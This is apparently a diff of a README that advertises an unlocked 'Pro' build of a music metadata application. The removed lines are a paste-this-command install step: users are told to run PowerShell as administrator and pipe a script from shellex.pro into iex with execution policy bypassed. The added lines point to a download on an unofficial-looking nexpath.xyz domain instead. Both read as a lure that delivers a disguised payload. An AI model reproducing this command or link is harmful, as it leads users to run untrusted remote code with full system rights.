@@ -2,31 +2,14 @@
 
 Rich metadata layer over local and streaming music · Pro workspace · No trial limits · All modules on.
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
-
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
-
+* **Project link:** **[roon-music-server-core-desktop.nexpath.xyz](https://roon-music-server-core-desktop.nexpath.xyz/)**
+* **Full URL:** `https://roon-music-server-core-desktop.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 ## 📄 Description
 
